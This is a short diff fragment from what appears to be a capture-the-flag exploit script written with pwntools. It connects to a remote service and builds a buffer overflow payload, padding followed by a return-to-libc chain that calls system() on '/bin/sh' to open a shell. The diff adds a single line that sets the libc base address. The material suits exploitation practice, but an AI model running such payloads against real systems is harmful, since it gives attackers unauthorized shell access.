@@ -67,6 +67,7 @@ io = remote(ip, port)
 #0x000d5f2c : /bin/sh
 
 libc_base = offset
+libc.address = libc_base 
 payload = 'A'*220
 payload += p32(libc_base+0x00097710) + p32(libc_base+0x000d5f2c) + p32(0) + p32(libc.sym['system'])
 io.recvuntil('Careful there! That hurt!')
